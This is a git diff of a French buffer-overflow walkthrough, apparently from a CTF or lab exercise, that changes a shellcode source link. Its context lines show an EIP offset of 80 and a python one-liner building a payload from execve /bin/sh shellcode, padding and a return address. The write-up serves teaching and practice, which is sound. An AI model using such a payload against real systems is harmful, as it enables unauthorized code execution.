@@ -164,7 +164,7 @@ On va se servir d'un [générateur de pattern](https://wiremask.eu/tools/buffer-
     ```
     - on rentre 0x37634136 dans le générateur de pattern et il nous donne un offset de 80.
 
-Nous créons donc un payload à l'aide du shellcode trouvé dans le lien suivant : http://shell-storm.org/shellcode/files/shellcode-219.php
+Nous créons donc un payload à l'aide du shellcode trouvé dans le lien suivant : https://www.exploit-db.com/exploits/41757
 
 On a 80 octets avant d'écraser l'EIP, donc on écrit les 21 octets de notre shellcode, 59 octets random (80 - 21) et notre adresse en little endian:
   - `python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\xcf\x84\x04\x08"' > /tmp/exploit`
